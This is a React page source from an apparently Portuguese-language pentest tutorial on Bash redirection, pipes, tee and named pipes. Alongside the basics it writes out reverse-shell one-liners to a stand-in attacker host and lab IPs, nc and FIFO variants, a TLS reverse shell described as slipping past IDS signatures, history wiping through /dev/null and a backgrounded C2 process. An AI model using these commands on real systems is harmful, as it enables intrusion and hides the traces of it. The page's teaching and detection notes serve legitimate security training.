import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Redirecionamento() {
  return (
    <PageContainer
      title="Redirecionamento e pipes"
      subtitle="stdin/stdout/stderr, /dev/null, /dev/tcp para reverse shell built-in, tee e named pipes."
      difficulty="intermediario"
      timeToRead="15 min"
    >
      <h2>Os três descritores que importam</h2>
      <p>
        Todo processo Unix nasce com três <strong>file descriptors</strong> abertos:
      </p>

      <CodeBlock
        language="bash"
        title="file descriptors padrão"
        code={`fd 0  →  STDIN   (entrada — do teclado por padrão)
fd 1  →  STDOUT  (saída normal — pra tela por padrão)
fd 2  →  STDERR  (saída de erro — também pra tela, mas separada)`}
      />

      <p>
        Redirecionar é apenas dizer ao Bash: "antes de executar, conecte esse fd a este
        arquivo / processo / socket". É a base de TUDO que você faz na linha de comando.
      </p>

      <h2>Operadores básicos</h2>
      <CommandTable
        title="redirecionamento — cheatsheet"
        variations={[
          { cmd: "cmd > arquivo", desc: "STDOUT vai pra arquivo (TRUNCA / sobrescreve).", output: "ls > listagem.txt" },
          { cmd: "cmd >> arquivo", desc: "STDOUT vai pra arquivo (APPEND).", output: "echo log >> /var/log/meu.log" },
          { cmd: "cmd < arquivo", desc: "STDIN lê do arquivo.", output: "wc -l < /etc/passwd" },
          { cmd: "cmd 2> arquivo", desc: "STDERR vai pra arquivo (1 e 2 separados).", output: "find / -name conf 2> erros.log" },
          { cmd: "cmd 2>&1", desc: "STDERR é redirecionado pro mesmo lugar que STDOUT.", output: "ler como: 'manda fd 2 pro mesmo destino do fd 1'" },
          { cmd: "cmd > arq 2>&1", desc: "Saída E erros, ambos pra arq. Ordem importa!", output: "Padrão para logs completos." },
          { cmd: "cmd &> arq", desc: "Atalho do anterior (Bash specific).", output: "Equivalente curto e legível." },
          { cmd: "cmd &>> arq", desc: "Idem mas em append.", output: "Logs longos." },
          { cmd: "cmd > /dev/null 2>&1", desc: "Descarta TUDO (saída e erros).", output: "Útil em background, cron silencioso." },
          { cmd: "cmd >&-", desc: "FECHA o STDOUT.", output: "Raro, mas existe." },
          { cmd: "cmd1 | cmd2", desc: "Pipe — STDOUT do cmd1 vira STDIN do cmd2.", output: "ls | wc -l" },
          { cmd: "cmd1 |& cmd2", desc: "Pipe incluindo STDERR (= 2>&1 |).", output: "make |& tee build.log" },
          { cmd: "<<EOF", desc: "Heredoc — bloco multi-linha vira STDIN.", output: "cat <<EOF\\nhello\\nEOF" },
          { cmd: "<<<\"texto\"", desc: "Herestring — uma string vira STDIN.", output: "base64 -d <<< \"aGVsbG8K\"" },
        ]}
      />

      <h2>Exemplos práticos</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "separar saída e erros — find joga MUITO 'permission denied'",
            cmd: "find / -name 'shadow' 2>/dev/null",
            out: `/etc/shadow
/usr/share/lintian/overrides/shadow`,
            outType: "info",
          },
          {
            comment: "guardar erros e saída em arquivos diferentes",
            cmd: "find / -name '*.conf' > achados.txt 2> erros.txt",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "pipeline + redirect + descarte",
            cmd: "cat /etc/passwd | grep -v nologin | tee users.txt | wc -l",
            out: "12",
            outType: "success",
          },
          {
            comment: "pipefail — sem isso o status é só do ÚLTIMO cmd do pipe",
            cmd: "set -o pipefail; false | true; echo $?",
            out: "1",
            outType: "warning",
          },
        ]}
      />

      <h2>/dev/null — o buraco negro</h2>
      <p>
        <code>/dev/null</code> é um arquivo especial: tudo que você escreve nele
        desaparece, e ele lê como vazio. É indispensável para silenciar comandos.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "ping silencioso, só interessa o exit code",
            cmd: "ping -c1 -W1 10.10.10.5 &>/dev/null && echo UP || echo DOWN",
            out: "UP",
            outType: "success",
          },
          {
            comment: "anti-forense: redirecionar history pra /dev/null",
            cmd: "ln -sf /dev/null ~/.bash_history",
            out: "(silencioso — agora nada será gravado no logout)",
            outType: "warning",
          },
          {
            comment: "background job sem mensagens",
            cmd: "nohup ./meu-c2 >/dev/null 2>&1 &",
            out: "[1] 18342",
            outType: "muted",
          },
        ]}
      />

      <h2>/dev/tcp e /dev/udp — sockets built-in!</h2>
      <p>
        Bash expõe pseudo-arquivos <code>/dev/tcp/HOST/PORTA</code> e
        <code> /dev/udp/HOST/PORTA</code> que abrem conexões TCP/UDP <strong>sem precisar
        de netcat, curl ou python</strong>. Esse é o coração do reverse shell mais famoso
        do mundo.
      </p>

      <CodeBlock
        language="bash"
        title="reverse shell em uma linha (o clássico)"
        code={`# Vítima → Atacante (atacante.tld:4444)
bash -i >& /dev/tcp/atacante.tld/4444 0>&1

# Quebrado por etapas:
# bash -i                       — inicia bash interativo
# >& /dev/tcp/atacante.tld/4444 — manda STDOUT+STDERR pro socket TCP
# 0>&1                          — STDIN também vem desse socket

# Do lado do atacante:
nc -lvnp 4444`}
      />

      <Terminal
        path="~"
        lines={[
          {
            comment: "no atacante (kali, IP 10.10.14.7)",
            cmd: "nc -lvnp 4444",
            out: `listening on [any] 4444 ...`,
            outType: "info",
          },
          {
            comment: "executado na vítima (após RCE, etc)",
            cmd: "bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'",
            out: "(processo da vítima fica conectado, sem retorno aparente)",
            outType: "muted",
          },
          {
            comment: "no atacante: a conexão chega",
            cmd: "(no listener anterior)",
            out: `connect to [10.10.14.7] from (UNKNOWN) [10.10.10.5] 51220
victim@target:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
victim@target:~$ `,
            outType: "success",
            noPrompt: true,
          },
        ]}
      />

      <h2>Variantes do reverse shell built-in</h2>
      <CodeBlock
        language="bash"
        title="quando o clássico falha — alternativas só com Bash"
        code={`# 1. Variante sem 'bash -i' (usa exec — bom em /bin/sh restrito)
exec 5<>/dev/tcp/atacante.tld/4444
cat <&5 | while read line; do \$line 2>&5 >&5; done

# 2. Sem '/dev/tcp' bloqueado mas com nc disponível
nc atacante.tld 4444 -e /bin/bash               # Linux, se nc-traditional
mkfifo /tmp/p; cat /tmp/p | bash 2>&1 | nc atacante.tld 4444 > /tmp/p

# 3. Bind shell built-in (atacante conecta na vítima)
exec 5<>/dev/tcp/0.0.0.0/4444   # NÃO funciona — listen NÃO é suportado
# Para listen sem nc, use socat ou ncat

# 4. UDP em vez de TCP (evade firewall só-TCP)
bash -i >& /dev/udp/atacante.tld/4444 0>&1     # ⚠ instável, sem ack
# Receba com: nc -ulvnp 4444

# 5. Encrypted (openssl s_server do lado atacante)
mkfifo /tmp/s
/bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect atacante.tld:443 > /tmp/s

# 6. PTY upgrade pós-shell (ESSENCIAL pra ter Ctrl+C, tab, etc)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# depois: Ctrl+Z; stty raw -echo; fg; reset; export TERM=xterm-256color; stty rows 40 cols 120`}
      />

      <h2>tee — pipe que ramifica</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "ver na tela E salvar em arquivo",
            cmd: "nmap -sV 10.10.10.5 | tee scan.txt",
            out: `Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 10.10.10.5
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1
80/tcp   open  http    Apache 2.4.52`,
            outType: "info",
          },
          {
            comment: "tee com sudo — escrever em arquivo do root sem precisar abrir editor",
            cmd: "echo '10.10.10.5 target.htb' | sudo tee -a /etc/hosts",
            out: "10.10.10.5 target.htb",
            outType: "warning",
          },
          {
            comment: "ramificar pra múltiplos comandos via process substitution",
            cmd: "cat acesso.log | tee >(grep ERROR > erros.log) >(wc -l > total.txt) | head -5",
            out: `(últimas linhas mostradas, e em paralelo: erros.log + total.txt criados)`,
            outType: "default",
          },
        ]}
      />

      <h2>Named pipes (FIFOs)</h2>
      <p>
        Um <strong>FIFO</strong> (criado com <code>mkfifo</code>) é um arquivo especial que
        funciona como pipe persistente: um processo escreve, outro lê. Útil para
        comunicação entre comandos rodando em terminais diferentes — e é a base da
        "encrypted reverse shell" via openssl.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "mkfifo /tmp/pipe",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            cmd: "ls -la /tmp/pipe",
            out: "prw-r--r-- 1 wallyson wallyson 0 abr  3 16:01 /tmp/pipe",
            outType: "info",
          },
          {
            comment: "no terminal A — fica esperando alguém escrever",
            cmd: "cat /tmp/pipe",
            out: "(bloqueado, aguardando)",
            outType: "muted",
          },
          {
            comment: "no terminal B — escreve no pipe",
            cmd: "echo 'mensagem do outro terminal' > /tmp/pipe",
            out: "(no terminal A aparece: mensagem do outro terminal)",
            outType: "success",
          },
        ]}
      />

      <CodeBlock
        language="bash"
        title="reverse shell encrypted via FIFO + openssl"
        code={`# === ATACANTE ===
# Gera certificado self-signed
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 30 -nodes -subj "/CN=c2"
cat key.pem cert.pem > pem.pem

# Listener TLS
openssl s_server -quiet -key key.pem -cert cert.pem -port 4443

# === VÍTIMA ===
mkfifo /tmp/s
/bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect atacante.tld:4443 > /tmp/s; rm /tmp/s

# Tráfego é TLS — IDS ASSINATURA não pega o "bash -i"`}
      />

      <h2>Avançado: fds extras (3, 4, 5...)</h2>
      <p>
        Você pode abrir descritores próprios. Útil em scripts robustos para preservar o
        terminal original enquanto redireciona.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "salva fd 1 original em fd 3, redireciona stdout, depois restaura",
            cmd: "exec 3>&1; exec 1>saida.log; echo \"vai pro arquivo\"; exec 1>&3 3>&-; echo \"voltou pra tela\"",
            out: `voltou pra tela`,
            outType: "info",
          },
          {
            cmd: "cat saida.log",
            out: "vai pro arquivo",
            outType: "default",
          },
          {
            comment: "abrir fd 5 bidirecional num socket",
            cmd: "exec 5<>/dev/tcp/google.com/80; printf 'GET / HTTP/1.0\\r\\n\\r\\n' >&5; head -3 <&5",
            out: `HTTP/1.0 301 Moved Permanently
Location: http://www.google.com/
Content-Type: text/html; charset=UTF-8`,
            outType: "warning",
          },
        ]}
      />

      <h2>Pegadinha: ordem do redirect importa</h2>
      <CodeBlock
        language="bash"
        title="por que '> arq 2>&1' ≠ '2>&1 > arq'"
        code={`# Versão CORRETA — tudo (saída + erro) vai pra arq
cmd > arq 2>&1
# Passo a passo:
# 1. STDOUT (fd 1) é apontado para arq
# 2. STDERR (fd 2) é apontado pra ONDE STDOUT está agora (= arq)

# Versão ERRADA — só saída vai pra arq, erros vão pra tela
cmd 2>&1 > arq
# Passo a passo:
# 1. STDERR (fd 2) é apontado pra ONDE STDOUT está agora (= terminal)
# 2. STDOUT (fd 1) é apontado pra arq
# Resultado: erros caem no terminal, saída no arquivo.

# Use sempre &> ou &>> que não tem essa pegadinha:
cmd &> arq
cmd &>> arq`}
      />

      <PracticeBox
        title="Reverse shell completo em /dev/tcp"
        goal="Demonstrar reverse shell sem nenhum binário externo no lado da vítima — só Bash."
        steps={[
          "Em um terminal, suba o listener: nc -lvnp 4444.",
          "Em outro terminal (simulando vítima), execute o one-liner Bash.",
          "Confirme que o shell apareceu no listener.",
          "Faça upgrade do PTY com python3 + stty.",
        ]}
        command={`# Terminal A (atacante):
nc -lvnp 4444

# Terminal B (vítima — local pra teste):
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'

# Já dentro do shell recebido, melhorar:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z (volta ao listener)
stty raw -echo; fg
reset
export TERM=xterm-256color
stty rows 40 cols 120`}
        expected={`listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 51221
wallyson@kali:~$ id
uid=1000(wallyson) gid=1000(wallyson) ...`}
        verify="O listener mostra 'connect to ... from ... ' e você consegue rodar comandos remotos. Após o upgrade do PTY, Ctrl+C, tab e setas funcionam normalmente."
      />

      <AlertBox type="warning" title="Em targets restritos: nem sempre /dev/tcp funciona">
        Algumas distros desabilitam <code>/dev/tcp</code> ao compilar Bash sem
        <code> --enable-net-redirections</code>. Em Alpine, busybox sh, e algumas builds
        embutidas isso falha. Tenha plano B: <code>nc</code>, <code>ncat</code>,
        <code> socat</code>, <code>python3 -c</code>, <code>perl -e</code>, ou um stager
        Powershell se for Windows.
      </AlertBox>

      <AlertBox type="info" title="Defesa: como detectar /dev/tcp em logs">
        Auditd com regra para <code>execve</code> contendo <code>/dev/tcp/</code> pega o
        clássico. Sysmon equivalente Linux (sysmonforlinux) também. EDRs sérios já
        detectam o padrão <code>bash -i &gt;&amp; /dev/tcp</code> por assinatura.
      </AlertBox>
    </PageContainer>
  );
}
